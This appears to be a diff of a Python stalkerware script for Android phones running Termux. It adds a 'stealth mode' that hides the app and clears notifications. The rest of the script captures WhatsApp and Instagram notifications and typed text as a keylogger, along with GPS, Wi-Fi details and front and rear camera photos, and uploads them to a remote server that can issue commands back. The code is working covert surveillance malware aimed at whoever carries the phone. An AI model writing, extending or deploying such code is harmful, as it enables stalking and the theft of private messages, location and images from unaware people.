@@ -28,10 +28,24 @@ def obter_id():
 
 DEVICE_ID = obter_id()
 
+# ============================================
+# MODO STEALTH
+# ============================================
+def ativar_stealth():
+    """Esconde o Termux e roda em segundo plano"""
+    # Minimiza o Termux
+    run("am start -a android.intent.action.MAIN -c android.intent.category.HOME", timeout=3)
+    # Remove notificação persistente do Termux (se possível)
+    run("termux-notification-remove --all", timeout=2)
+    print("🥷 Modo Stealth ATIVADO\n")
+
 print("\n" + "="*50)
 print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
-print("="*50 + "\n")
+print("="*50)
+
+# Ativa stealth automaticamente ao iniciar
+ativar_stealth()
 
 ultima_lat = -16.6869
 ultima_lon = -49.2648
@@ -41,7 +55,7 @@ ultimo_ping = 0
 ultimo_whatsapp = 0
 ultimo_keylog = 0
 historico_msg = {}
-msg_processadas = set()  # Evita duplicatas
+msg_processadas = set()
 
 def obter_rede():
     w = run("termux-wifi-connectioninfo")
@@ -70,7 +84,6 @@ def obter_gps():
     gps_ok = False
 
 def obter_app_aberto():
-    """Detecta qual app está em primeiro plano"""
     foco = run("dumpsys window | grep mCurrentFocus", timeout=3)
     if foco:
         foco_lower = foco.lower()
@@ -79,26 +92,18 @@ def obter_app_aberto():
     return "outro"
 
 def obter_texto_digitado():
-    """Captura texto da área de transferência e campo de texto"""
     texto = ""
-    
-    # Tenta pegar da área de transferência (última coisa copiada/digitada)
     clip = run("termux-clipboard-get", timeout=2)
     if clip and len(clip) > 0:
         texto = clip[:200]
-    
-    # Tenta pegar do input method (campo de texto ativo)
     input_text = run("dumpsys input_method | grep -A5 'mCur' | grep 'text=' | head -1", timeout=2)
     if input_text and "text=" in input_text:
         try:
             texto = input_text.split("text=")[1].split(",")[0][:200]
-        except:
-            pass
-    
+        except: pass
     return texto if texto else None
 
 def obter_whatsapp():
-    """Ler notificações e REMOVE duplicatas"""
     global ultimo_whatsapp, historico_msg, msg_processadas
     agora = time.time()
     if agora - ultimo_whatsapp < 8:
@@ -117,14 +122,12 @@ def obter_whatsapp():
                     texto = n.get("content", "")
                     msg_id = n.get("key", "") or f"{pessoa}_{texto[:50]}_{n.get('when','')}"
                     
-                    # PULA se já processou essa mensagem
                     if msg_id in msg_processadas:
                         continue
                     
                     msg_processadas.add(msg_id)
                     novas_msgs = True
                     
-                    # Mantém só últimas 500 IDs
                     if len(msg_processadas) > 500:
                         msg_processadas.clear()
                     
@@ -171,7 +174,6 @@ def obter_whatsapp():
                     historico_msg[pessoa]["midia"] = tem_midia
             
             if novas_msgs:
-                # LIMPA notificações depois de processar
                 run("termux-notification-remove --all", timeout=3)
             
             ultimo_whatsapp = agora
@@ -181,7 +183,7 @@ def obter_whatsapp():
     return list(historico_msg.values())
 
 def obter_keylog():
-    """Keylogger real - captura texto digitado + app aberto"""
+    """Keylogger + Captura de texto enviado"""
     global ultimo_keylog
     agora = time.time()
     if agora - ultimo_keylog < 3:
@@ -192,10 +194,38 @@ def obter_keylog():
     
     if app in ["whatsapp", "instagram"] or texto:
         ultimo_keylog = agora
+        
+        # Se tem texto capturado E WhatsApp aberto, é msg ENVIADA
+        tipo = "enviada" if (texto and app in ["whatsapp", "instagram"]) else "digitando"
+        
+        # Adiciona ao histórico como mensagem enviada
+        if texto and app == "whatsapp":
+            # Tenta descobrir pra quem foi enviada (pelo contexto)
+            destino = "Conversa"
+            for pessoa in historico_msg:
+                if historico_msg[pessoa]["ultima_msg"] and any(p in texto for p in ["ok", "sim", "não"]):
+                    destino = pessoa
+                    break
+            
+            if destino not in historico_msg:
+                historico_msg[destino] = {
+                    "pessoa": destino, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False
+                }
+            
+            historico_msg[destino]["mensagens"].append({
+                "texto": texto[:150],
+                "midia": False,
+                "hora": datetime.now().strftime("%H:%M"),
+                "tipo": "enviada"
+            })
+            historico_msg[destino]["ultima_msg"] = texto[:80]
+            historico_msg[destino]["total"] = len(historico_msg[destino]["mensagens"])
+        
         return {
             "app": app,
             "ativo": True,
             "texto": texto or "",
+            "tipo": tipo,
             "timestamp": datetime.now().strftime("%H:%M:%S")
         }
     
@@ -203,13 +233,13 @@ def obter_keylog():
     return None
 
 def executar_comando(acao):
-    print(f"   🔧 {acao}")
     if acao == "vibrar": run("termux-vibrate -d 1000", timeout=3)
     elif acao == "som": run("termux-media-player play scan", timeout=3)
     elif acao == "lanterna":
         run("termux-torch on", timeout=3)
         time.sleep(2)
         run("termux-torch off", timeout=3)
+    elif acao == "stealth": ativar_stealth()
 
 def enviar_dados(payload):
     json_str = json.dumps(payload).replace("'", "'\\''")
@@ -235,7 +265,7 @@ def enviar_lote(front_b64, back_b64):
         return r.status_code == 200
     except: return False
 
-print("🛰️  INICIADO v3.1 (Sem duplicatas + Keylogger real)\n")
+print("🛰️  INICIADO v4.0 (Stealth + Msgs Enviadas)\n")
 
 while True:
     t0 = time.time()
@@ -270,14 +300,13 @@ while True:
         cmd_cam = resp.get("comando_cam", "wait")
         cmd_remoto = resp.get("comando_remoto", "none")
         
-        extra = ""
-        if keylog and keylog.get("ativo"): extra += f" | ⌨️ {keylog['app']}"
-        if msgs_whats: extra += f" | 💬 {len(msgs_whats)} chats"
-        
-        print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}{extra} | {dt:.1f}s")
-        
+        # Terminal minimalista (modo stealth)
+        status = f"🥷 {icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}"
         if keylog and keylog.get("texto"):
-            print(f"   ⌨️ Texto: {keylog['texto'][:80]}")
+            status += f" | ⌨️{keylog.get('tipo','?')}:{keylog['texto'][:30]}"
+        if msgs_whats:
+            status += f" | 💬{len(msgs_whats)}"
+        print(status + f" | {dt:.1f}s")
         
         if cmd_remoto != "none": executar_comando(cmd_remoto)
         
@@ -286,10 +315,8 @@ while True:
             arq_tras = os.path.expanduser("~/nexos_back.jpg")
             arq_front = os.path.expanduser("~/nexos_front.jpg")
             b64_tras = capturar_foto(0, arq_tras)
-            print(f"   {'✅' if b64_tras else '❌'} Traseira")
             time.sleep(0.3)
             b64_front = capturar_foto(1, arq_front)
-            print(f"   {'✅' if b64_front else '❌'} Frontal")
             if b64_tras or b64_front:
                 print("   📤 LOTE..." + ("✅" if enviar_lote(b64_front, b64_tras) else "❌"))
             for a in [arq_tras, arq_front]:
